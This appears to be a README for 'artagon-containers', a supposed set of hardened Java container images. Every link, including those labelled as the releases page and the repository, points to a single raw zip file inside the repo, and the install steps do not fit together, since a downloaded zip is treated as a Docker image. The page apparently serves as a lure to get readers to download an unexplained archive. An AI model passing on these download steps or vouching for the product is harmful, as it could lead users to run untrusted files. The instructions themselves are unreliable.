# 🎉 artagon-containers - Secure and Easy Containers for Java

[![Download artagon-containers](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)

## 🚀 Getting Started

Welcome to the **artagon-containers** project! This repository provides hardened multi-architecture OCI containers tailored for JVM workloads. Our containers support Java Development Kit (JDK) versions 25, 26, and Valhalla, ensuring a secure and efficient environment for your applications.

## 🛠️ System Requirements

To use artagon-containers, your system should meet the following requirements:

- **Operating System**: Linux, macOS, or Windows with WSL2
- **Docker**: Version 20.10.0 or higher
- **Memory**: At least 2 GB RAM
- **CPU**: A multi-core processor

## 📥 Download & Install

To start using artagon-containers, follow these steps:

1. **Visit the Releases Page:** Click the link below to go to the Releases page.
   [Visit the Releases Page to Download](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)

2. **Select the Version:** Look for the latest release version. Each version includes essential files and detailed release notes.

3. **Download the Container:** Click on the container image suitable for your workload. You will find options for different architectures, such as amd64 and arm64.

4. **Run the Container:** After you download the image, open your terminal or command prompt and use the following command:
   ```bash
   docker run -it <image-name>
   ```
   Replace `<image-name>` with the name of the downloaded image.

## 📋 Features

- **Security-First Design**: Our containers are non-root, digest-pinned, SBOM-attested, and signed with Cosign. This ensures your applications run in a secure environment.
- **Multi-Architecture Support**: Easily run your applications on various platforms with support for both amd64 and arm64 architectures.
- **Optimized for JVM Workloads**: Designed specifically for Java applications, artagon-containers ensure performance and reliability.
- **Distroless Images**: Enjoy minimal image sizes and reduced attack surfaces with our distroless design.

## ⚙️ Usage Tips

- **Managing Containers**: Learn basic Docker commands to manage your containers effectively. For example, use `docker ps` to view running containers.
- **Updating Containers**: Keep your containers up to date by regularly checking the Releases page.

## 📞 Need Help?

If you encounter any issues or need assistance, feel free to open an issue on our GitHub repository, or check our documentation for troubleshooting tips.

## 🔗 Community and Resources

Join the conversation and stay updated by following these resources:

- [GitHub Repository](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)
- Community Forums and Discussions
- Docker Documentation

## 🏷️ Tags

This project revolves around the following topics: chainguard, cloud-native, containers, cosign, distroless, docker, hardened, java, jdk26, jvm, kubernetes, multi-arch, oci, openjdk, sbom, security, supply-chain, ubi, valhalla, wolfi.

## 🔍 Future Updates

We are committed to improving artagon-containers. Upcoming features may include enhanced support for additional programming languages and frameworks, as well as performance optimizations. Stay tuned for updates!

## 🎈 Conclusion

Thank you for choosing **artagon-containers**. We hope this guide helps you get up and running smoothly. Happy coding!